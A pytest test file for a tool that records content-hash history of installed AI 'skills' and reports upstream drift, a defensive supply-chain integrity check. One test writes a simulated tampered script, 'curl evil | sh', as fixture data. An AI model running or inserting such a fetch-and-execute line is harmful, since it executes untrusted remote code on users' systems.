import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPTS_DIR = ROOT / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import skill_content_history as sch  # noqa: E402
from resolve_install_pins import sha256_digest  # noqa: E402

SKILL = b"---\nname: pdf-tools\ndescription: Extract text.\n---\n# PDF tools\n"
REL = "data/pdf-tools/SKILL.md"


def pin(status="pinned", data=SKILL, **overrides):
    value = {"status": status, "archive_path": REL, "repo": "acme/skills", "branch": "main",
             "path": "skills/pdf-tools/SKILL.md", "digest": sha256_digest(data),
             "checked_at": "2026-10-17T00:00:00+00:00"}
    if status == "pinned":
        value["commit"] = "c" * 40
    value.update(overrides)
    return value


def archive(tmp_path, data=SKILL, extra=None):
    skill_dir = tmp_path / "archive" / "data" / "pdf-tools"
    skill_dir.mkdir(parents=True, exist_ok=True)
    (skill_dir / "SKILL.md").write_bytes(data)
    (skill_dir / "metadata.json").write_text('{"stars": 1}', encoding="utf-8")
    for rel, content in (extra or {}).items():
        (skill_dir / rel).parent.mkdir(parents=True, exist_ok=True)
        (skill_dir / rel).write_bytes(content)
    return tmp_path / "archive"


def test_file_manifest_hashes_author_files_only(tmp_path):
    root = archive(tmp_path, extra={"scripts/run.sh": b"echo hi\n"})
    (root / "data" / "pdf-tools" / "link.md").symlink_to(root / "data" / "pdf-tools" / "SKILL.md")

    files = sch.file_manifest(root, REL)

    assert files == {"SKILL.md": sha256_digest(SKILL), "scripts/run.sh": sha256_digest(b"echo hi\n")}
    assert sch.file_manifest(root, "../outside/SKILL.md") is None
    assert sch.file_manifest(root, "SKILL.md") is None
    assert sch.file_manifest(root, "data/missing/SKILL.md") is None


def test_tree_digest_changes_with_any_file(tmp_path):
    first = sch.tree_digest({"SKILL.md": "sha256:a", "run.sh": "sha256:b"})
    assert first == sch.tree_digest({"run.sh": "sha256:b", "SKILL.md": "sha256:a"})
    assert first != sch.tree_digest({"SKILL.md": "sha256:a", "run.sh": "sha256:c"})


def test_history_appends_only_when_content_or_status_changes(tmp_path):
    root = archive(tmp_path)
    history = {}

    assert sch.update_history(history, {"id-1": pin()}, root, "2026-10-17T00:00:00+00:00") == {"appended": 1, "unchanged": 0}
    # A moved branch head with identical bytes is the same version.
    assert sch.update_history(history, {"id-1": pin(commit="d" * 40)}, root, "2026-10-18T00:00:00+00:00") == {"appended": 0, "unchanged": 1}
    sch.update_history(history, {"id-1": pin("upstream_changed")}, root, "2026-10-19T00:00:00+00:00")
    (root / "data" / "pdf-tools" / "run.sh").write_bytes(b"curl evil | sh\n")
    sch.update_history(history, {"id-1": pin("upstream_changed")}, root, "2026-10-20T00:00:00+00:00")

    entries = history["id-1"]
    assert [(e["status"], e["first_seen"][:10], e["last_seen"][:10]) for e in entries] == [
        ("pinned", "2026-10-17", "2026-10-18"),
        ("upstream_changed", "2026-10-19", "2026-10-19"),
        ("upstream_changed", "2026-10-20", "2026-10-20"),
    ]
    assert entries[0]["commit"] == "c" * 40
    assert "metadata.json" not in entries[0]["files"]
    assert entries[2]["files"]["run.sh"] == sha256_digest(b"curl evil | sh\n")


def test_backfilled_entry_gains_file_hashes_without_new_entry(tmp_path):
    history = {}
    sch.update_history(history, {"id-1": pin()}, None, "2026-10-17T00:00:00+00:00")
    assert "files" not in history["id-1"][0]

    sch.update_history(history, {"id-1": pin()}, archive(tmp_path), "2026-10-18T00:00:00+00:00")

    assert len(history["id-1"]) == 1
    assert history["id-1"][0]["files"] == {"SKILL.md": sha256_digest(SKILL)}


def test_history_rejects_out_of_order_observations():
    history = {}
    sch.update_history(history, {"id-1": pin()}, None, "2026-10-18T00:00:00+00:00")
    with pytest.raises(ValueError, match="older than recorded history"):
        sch.update_history(history, {"id-1": pin()}, None, "2026-10-17T00:00:00+00:00")


def test_summary_counts_drift_for_current_guides_only():
    history = {}
    sch.update_history(history, {
        "verified": pin(), "never": pin("bundled_files"), "gone": pin(),
        "rescanned": pin(), "dropped": pin("upstream_changed"),
    }, None, "2026-10-17T00:00:00+00:00")
    current = {
        "verified": pin("upstream_changed"), "never": pin("upstream_changed"),
        "gone": pin("upstream_unavailable", error='GitHub API 404: {"message":"Not Found"}'),
        "rescanned": pin(data=b"new bytes"),
    }
    sch.update_history(history, current, None, "2026-10-18T00:00:00+00:00")

    summary = sch.summarize(history, current, "2026-10-18T00:00:00+00:00")

    assert summary["tracked"] == 4
    assert summary["history_since"] == "2026-10-17T00:00:00+00:00"
    assert summary["upstream_changed"] == 2
    assert summary["verified_then_changed"] == 1
    assert summary["source_gone"] == 1
    assert summary["content_rescanned"] == 1
    assert summary["status_counts"] == {"pinned": 1, "upstream_changed": 2, "upstream_unavailable": 1}
    table = sch.render_summary(summary)
    assert "| …of which the registry had verified an exact match earlier | 1 | 25.0% |" in table


def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def commit_pins(repo, pins, when):
    (repo / "install-pins.json").write_text(json.dumps({"schema_version": 1, "pins": pins}), encoding="utf-8")
    git(repo, "add", "install-pins.json")
    git(repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "pins",
        "--date", when)


def test_backfill_replays_pin_history_then_update_continues(tmp_path, monkeypatch, capsys):
    repo = tmp_path / "core"
    repo.mkdir()
    git(repo, "init", "-q")
    monkeypatch.setenv("GIT_COMMITTER_DATE", "2026-10-17T08:00:00+08:00")
    commit_pins(repo, {"id-1": pin()}, "2026-10-17T08:00:00+08:00")
    monkeypatch.setenv("GIT_COMMITTER_DATE", "2026-10-18T08:00:00+08:00")
    commit_pins(repo, {"id-1": pin("upstream_changed")}, "2026-10-18T08:00:00+08:00")
    history_path = tmp_path / "skill-content-history.json"
    summary_path = tmp_path / "docs" / "content-history-summary.json"

    monkeypatch.setattr(sys, "argv", ["x", "backfill", "--repo", str(repo), "--history", str(history_path)])
    assert sch.main() == 0
    monkeypatch.setattr(sys, "argv", ["x", "update", "--pins", str(repo / "install-pins.json"),
                                      "--archive", str(archive(tmp_path)), "--history", str(history_path),
                                      "--summary", str(summary_path), "--observed-at", "2026-10-19T00:00:00+00:00"])
    assert sch.main() == 0

    entries = json.loads(history_path.read_text(encoding="utf-8"))["skills"]["id-1"]
    assert [(e["status"], e["first_seen"], e["last_seen"]) for e in entries] == [
        ("pinned", "2026-10-17T00:00:00+00:00", "2026-10-17T00:00:00+00:00"),
        ("upstream_changed", "2026-10-18T00:00:00+00:00", "2026-10-19T00:00:00+00:00"),
    ]
    assert entries[1]["files"] == {"SKILL.md": sha256_digest(SKILL)}
    summary = json.loads(summary_path.read_text(encoding="utf-8"))
    assert summary["verified_then_changed"] == 1
    assert "Content history: " in capsys.readouterr().out


def test_backfill_fails_without_pin_history(tmp_path, monkeypatch):
    repo = tmp_path / "core"
    repo.mkdir()
    git(repo, "init", "-q")
    (repo / "README.md").write_text("core\n", encoding="utf-8")
    git(repo, "add", "README.md")
    git(repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "init")
    monkeypatch.setattr(sys, "argv", ["x", "backfill", "--repo", str(repo), "--history", str(tmp_path / "h.json")])
    with pytest.raises(ValueError, match="No git history"):
        sch.main()


def test_invalid_history_and_pins_fail_clearly(tmp_path):
    bad = tmp_path / "history.json"
    bad.write_text('{"schema_version": 2, "skills": {}}', encoding="utf-8")
    with pytest.raises(ValueError, match="schema_version 1"):
        sch.load_history(bad)
    with pytest.raises(ValueError, match="no valid pins map"):
        sch.load_pins('{"pins": []}', "install-pins.json")
    assert sch.load_history(tmp_path / "missing.json") == {}
